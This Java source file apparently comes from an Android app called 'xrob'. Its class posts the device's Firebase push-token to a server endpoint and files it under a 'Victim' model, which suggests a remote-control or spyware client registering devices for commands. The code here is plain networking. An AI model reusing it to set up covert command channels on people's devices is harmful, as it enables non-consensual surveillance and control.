package com.theah64.xrob.asynctasks;

import android.content.Context;
import android.util.Log;

import com.theah64.xrob.models.Victim;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.PrefUtils;

import org.json.JSONException;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by theapache64 on 28/9/16.
 */

public class FCMSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {

    private static final String X = FCMSynchronizer.class.getSimpleName();
    private final String newFcmId;

    public FCMSynchronizer(Context context, String apiKey) {
        super(context, apiKey);
        this.newFcmId = PrefUtils.getInstance(context).getString(PrefUtils.KEY_FCM_ID);
    }

    @Override
    protected Void doInBackground(String... strings) {

        if (newFcmId != null) {
            new APIRequestGateway(getContext(), new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKey) {

                    final Request fcmUpdateRequest = new APIRequestBuilder("/update/fcm", apiKey)
                            .addParam(Victim.KEY_THE_FCM_ID, newFcmId)
                            .build();

                    OkHttpUtils.getInstance().getClient().newCall(fcmUpdateRequest).enqueue(new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {
                            e.printStackTrace();
                        }

                        @Override
                        public void onResponse(Call call, Response response) throws IOException {
                            try {
                                new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                                PrefUtils.getInstance(getContext()).getEditor()
                                        .putBoolean(PrefUtils.KEY_IS_FCM_SYNCED, true)
                                        .commit();
                            } catch (JSONException | APIResponse.APIException e) {
                                e.printStackTrace();
                            }
                        }
                    });

                }

                @Override
                public void onFailed(String reason) {
                    Log.e(X, "Failed to update fcm : " + reason);
                }
            });
        } else {
            Log.e(X, "FCM ID is null , so not syncing...");
        }

        return null;
    }
}
